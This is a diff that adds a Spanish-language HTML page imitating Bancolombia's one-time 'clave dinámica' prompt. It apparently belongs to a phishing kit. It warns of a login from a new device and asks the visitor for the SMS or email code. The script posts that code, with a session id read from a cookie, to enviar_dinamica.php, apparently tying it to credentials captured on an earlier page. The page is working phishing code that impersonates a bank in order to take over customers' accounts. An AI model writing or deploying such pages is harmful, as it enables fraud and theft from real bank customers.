@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bancolombia - Clave Dinámica</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #2b2a28 0%, #2b2a28 100%);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #454648;
+      border-radius: 10px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    .card h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .input-icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 17px;
+      opacity: 0.7;
+      user-select: none;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px 10px 8px 40px;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid white;
+      color: white;
+      font-size: 16px;
+    }
+    .input-field::placeholder { color: #ccc; }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #FFD700;
+      color: #2c2c2c;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: transform 0.3s;
+    }
+    .btn:hover { transform: translateY(-2px); }
+    .error {
+      display: none;
+      color: #FFD700;
+      background: #2b2a28;
+      border: 1px solid #FFD700;
+      border-radius: 6px;
+      padding: 10px;
+      margin-bottom: 15px;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Ingresa tu clave dinámica</h1>
+    <div class="error" id="errorMsg"></div>
+    <p>Detectamos un inicio de sesión desde un nuevo dispositivo. Ingresa la clave dinámica recibida por SMS o correo para confirmar tu identidad.</p>
+    <br /><br />
+    <form id="dinForm" action="enviar_dinamica.php" method="POST" autocomplete="off">
+      <input type="hidden" name="id" id="solicitudId" value="" />
+      <div class="form-group">
+        <img src="candado.png" class="input-icon" alt="SMS" />
+        <input
+          type="text"
+          name="claveDinamica"
+          id="claveDinamica"
+          class="input-field"
+          placeholder="Clave dinámica"
+          required
+          maxlength="6"
+          pattern="\d{4,6}"
+          inputmode="numeric"
+          autocomplete="off"
+        />
+      </div>
+      <br />
+      <button type="submit" class="btn">Validar</button>
+    </form>
+  </div>
+
+  <script>
+    // Lee cookie por nombre
+    function getCookie(name) {
+      const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+      return match ? decodeURIComponent(match[2]) : '';
+    }
+
+    // Obtener sessionId
+    const id = getCookie('sessionId');
+    if (!id) {
+      alert('No hay sesión activa. Debes iniciar sesión de nuevo.');
+      window.location.href = 'index.html';
+    }
+    // Insertar en el campo oculto
+    document.getElementById('solicitudId').value = id;
+
+    // Validar formulario
+    document.getElementById('dinForm').addEventListener('submit', e => {
+      const v = document.getElementById('claveDinamica').value.trim();
+      const err = document.getElementById('errorMsg');
+      err.style.display = 'none';
+      if (!/^\d{4,6}$/.test(v)) {
+        e.preventDefault();
+        err.textContent = 'Debes ingresar entre 4 y 6 dígitos.';
+        err.style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
